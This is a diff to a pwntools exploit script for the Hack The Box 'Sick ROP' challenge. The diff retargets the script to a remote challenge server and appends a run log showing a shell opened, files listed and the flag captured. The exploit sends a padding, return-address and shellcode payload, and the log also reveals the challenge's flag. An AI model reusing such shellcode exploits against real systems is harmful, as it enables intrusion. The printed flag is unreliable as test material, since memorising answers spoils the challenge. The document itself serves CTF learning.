@@ -11,7 +11,9 @@ https://fdlucifer.github.io/2021/01/11/sick-rop/
 
 from pwn import *
 
-io = process('./sick_rop')
+ip,port = "68.183.47.198",32383
+#io = process('./sick_rop')
+io = remote(ip, port)
 
 context.arch = 'amd64'
 
@@ -110,3 +112,27 @@ payload = padding + p64(vuln_ptr+0x20) + assembled_shellcode
 io.sendline(payload)
 io.recv()
 io.interactive()
+
+'''
+root@szhan21-mobl1:~/github/htb/ctf/pwn/SickROP# python2 dec.py
+[+] Opening connection to 68.183.47.198 on port 32383: Done
+[*] '/root/github/htb/ctf/pwn/SickROP/sick_rop'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Switching to interactive mode
+$ ls
+$ ls
+flag.txt
+run_challenge.sh
+sick_rop
+flag.txt
+run_challenge.sh
+sick_rop
+$ cat flag.txt
+HTB{why_st0p_wh3n_y0u_cAn_s1GRoP!?}
+$
+
+'''
